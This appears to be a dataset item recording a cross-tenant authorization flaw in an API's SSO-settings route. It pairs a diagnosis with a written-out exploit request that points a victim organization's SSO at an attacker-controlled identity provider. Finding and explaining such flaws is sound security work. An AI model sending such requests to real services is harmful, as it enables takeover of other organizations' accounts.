diagnosis: The router dependency require_org_admin confirms the caller has administrative privileges within their own organization. However, the route accepts org_id as a URL parameter and updates the organization's SSO identity provider URL without verifying admin.org_id == org_id. An administrator from one company can reconfigure SSO on another company's tenant, enabling full enterprise account takeover.
exploit_request:
PUT /admin/organizations/org_victim_corp/sso-settings HTTP/1.1
Host: api.example.com
Authorization: Bearer <attacker_org_admin_jwt>
Content-Type: application/json

{"idp_metadata_url": "https://attacker-idp.com/saml/metadata", "enforce_sso": true}
